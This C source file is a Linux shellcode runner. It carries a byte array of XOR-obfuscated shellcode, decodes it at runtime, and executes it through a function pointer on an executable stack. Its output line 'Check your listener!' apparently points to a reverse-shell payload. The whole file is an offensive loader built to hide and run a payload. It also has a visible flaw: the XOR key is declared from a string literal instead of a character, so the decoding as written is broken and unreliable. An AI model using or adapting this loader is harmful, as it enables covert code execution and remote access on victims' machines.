#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

// gcc -o LinuxShellcodeRunner.o LinuxShellcodeRunner.c -z execstack

// insert obfuscated shellcode here
unsigned char buf[] = 
"\x4C\x35\xFB\x6E\x0D\x5C\x9D\xB2\x14\x4C"
"\x8D\xD2\x49\x35\xCD\x6E\x26\x45\x5E\xB6"
"\x03\x0B\x01\x4C\x81\xC4\x7C\x55\x6E\x0E"
"\x45\x5D\x54\x6E\x2D\x5C\x9D\x6E\x06\x5B"
"\x6E\x05\x5A\x0B\x01\x4C\x81\xC4\x7C\x3F"
"\x4C\x93\x4C\xBD\x06\x04\x04\x12\xC4\xAC"
"\x35\xA3\x55\x4C\x8D\xE2\x6E\x14\x5E\x6E"
"\x2E\x5C\x0B\x01\x5D\x4C\x81\xC4\x7D\x21"
"\x4D\xFB\xCD\x70\x1C\x53\x6E\x27\x5C\x6E"
"\x04\x6E\x01\x4C\x8D\xE3\x4C\x35\xF2\x0B"
"\x01\x5D\x5D\x5B\x4C\x81\xC4\x7D\xC3\x6E"
"\x38\x5C\x6E\x05\x5B\x0B\x01\x5A\x6E\x7A"
"\x5E\x0B\x01\x4C\x81\xC4\x7C\xE9\xFB\xE2"
"\x04";

int main (int argc, char **argv)
{
	char xor_key = "J";
	int arraysize = (int) sizeof(buf);

    // decode shellcode
	printf("[+] Decrypting shellcode\n");
	for (int i=0; i<arraysize-1; i++)
	{
		buf[i] = buf[i]^xor_key;
	}
    
	// run shellcode
	printf("[+] Executing shellcode\n");
	int (*ret)() = (int(*)())buf;

	printf("[+] Check your listener!\n");
	ret();
}
